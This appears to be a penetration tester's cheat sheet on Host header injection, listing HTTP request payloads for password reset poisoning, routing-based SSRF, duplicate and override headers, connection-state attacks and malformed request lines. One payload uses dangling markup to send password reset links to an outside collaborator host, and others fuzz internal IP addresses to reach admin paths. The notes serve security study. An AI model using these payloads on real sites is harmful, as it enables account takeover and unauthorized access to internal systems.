# What can we do via Host Header injection?
```txt
    1. Password Reset Poisoning
    2. Routing Based SSRF
```
# How to test?
___
## Supply an arbitrary Host header. If vulnerable, this will generate 200 OK response.
```txt
GET /example HTTP/1.1
Host: google.com
```
## Check for flawed validation (Check portswigger for more)
#### Instead of receiving an "Invalid Host header" response, you might find that your request is blocked as a result of some kind of security measure. If this happen, try to use port or non numeric staff in port. (You can use this method for password reset link hijacking via dangling markup) 
```txt
GET /example HTTP/1.1
Host: vulnerable-website.com:bad-stuff-here
Host: vulnweb.com:'<a href="//8jsdeu8fe6r8ju28t0lsplhjhan1bvzk.oastify.com/? (Password reset link hijacking via dangling markup)
```
## Send ambiguous requests
#### Inject duplicate Host headers
```txt
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: google.com
```
#### Supply an absolute URL
##### Normal case
```txt
GET https://vulnerable-website.com/ HTTP/1.1
Host: google.com
```
##### SSRF via flawed request parsing
```txt
GET https://0ada009a03fb929382cd2e7000e600be.web-security-academy.net HTTP/2
Host: ybdifpxyiesrimyyvm2e9wxgy74yssgh.oastify.com
```
In this case, now try bruteforcing ip address.
#### Add line wrapping
```txt
GET /example HTTP/1.1
    Host: google.com
Host: vulnerable-website.com
```
#### Inject host override headers
```txt
X-Host:
X-Original-URL:
X-Forwarded-Server:
X-HTTP-Host-Override:
Forwarded:
X-Forwarded-For:
```
## Accessing restricted functionality or Routing Based SSRF
#### It is common for websites to not restrict access to certain functionality for internal users only or host private sites in same server. Try to access it by localhost or brute-forcing.
```txt
Host: localhost
Host: 127.0.0.1
Host: 192.168.0.$fuzz$
```
## Connection state attacks
#### For performance reasons, many websites reuse connections for multiple request/response cycles with the same client. In this case, you can potentially bypass this validation by sending an innocent-looking initial request then following up with your malicious one down the same connection. 

Step 1 >> Duplicate a request.
Step 2 >> Change the Connection header to keep-alive in 1st request.
Step 3 >> Change the request method GET to POST in 2nd request.
Step 4 >> Mention the administrator path and change the host to local ip in 2nd request.
```txt
POST /admin HTTP/1.1
Host: 192.168.0.1 
```
## SSRF via a malformed request line
####  A reverse proxy might take the path from the request line, prefix it with http://backend-server, and route the request to that upstream URL. If the path starts with @ instead of /, the resulting upstream URL will be http://backend-server@private-intranet/example, which most HTTP libraries interpret as a request to access private-intranet with the username backend-server. So try to use @ instead of /
```txt
GET @private-intranet/example HTTP/1.1
```
